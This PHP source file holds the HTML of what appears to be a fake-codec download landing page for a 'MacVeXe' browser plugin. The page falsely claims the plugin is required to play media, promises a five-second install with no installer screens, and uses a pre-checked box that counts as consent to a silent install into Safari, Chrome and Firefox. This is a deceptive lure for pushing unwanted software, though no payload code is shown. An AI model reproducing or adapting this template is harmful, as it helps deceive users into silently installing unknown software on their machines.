<?php

namespace LPO;

class MacVXTorrentBrand {

	const ID = 'MacVeXe';
	public static $html = '';

    public static function getHtml()
    {
        return static::$html;
    }
}

MacVXTorrentBrand::$html = '<div>
Welcome to the '.MacVXTorrentBrand::ID.' download Page.
	<br/>
	'.MacVXTorrentBrand::ID.' is required to encode and/or decode (Play) audio files in high quality.
	<br/>
	The plugin is designed as a user-friendly solution for playing all your movie files on the web.
	<br/>
	<span style="font-weight: bold;">Please Note:</span>
	<br/>
	The installer that is being downloaded from this page contains no UI.
	<br/>
	By running the file being downloaded you will install the '.MacVXTorrentBrand::ID.' Mac OS Plugin in Safari, Chrome and Firefox.
	<br/>
	<span style="font-weight: bold;">'.MacVXTorrentBrand::ID.' installation takes only 5 seconds. </span>
	<br/>
	When you have completed the installation of the video codec, you will be able to play movies and videos in high quality.
</div>
<div id="ch"><input type="checkbox" checked id="chek" onclick="ischez()">
    By clicking the "Install Now" button below, you agree to the '.MacVXTorrentBrand::ID.' plugin terms and conditions, Eula and Privacy Policy and to install the plugin without showing installer screens.
</div>';